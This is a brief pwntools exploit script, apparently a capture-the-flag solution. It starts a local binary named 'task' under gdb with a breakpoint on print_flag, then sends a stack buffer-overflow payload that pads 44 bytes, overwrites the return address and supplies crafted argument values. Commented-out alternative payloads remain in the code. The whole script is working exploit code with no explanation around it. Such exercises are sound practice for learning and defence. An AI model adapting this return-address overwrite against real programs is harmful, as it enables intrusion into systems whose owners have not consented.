from pwn import *

io = gdb.debug('./task','''
break print_flag
continue
''')

# payload = '\x00' * 36 + '\x00\xc0\xff\xee' + '\xff\xff\xfa\xc7' + '\xd6\x91\x04\x08'
payload = '\x00' * 44 + '\xd6\x91\x04\x08' + '\x00' * 4 + '\xc7\xfa\xff\xff' + '\xee\xff\xc0\x00'
# payload = 'a' * 20

io.recvuntil("Do you want to say something?")
io.sendline(payload)

io.interactive()

s = io.recvall(timeout=10)
print(s)
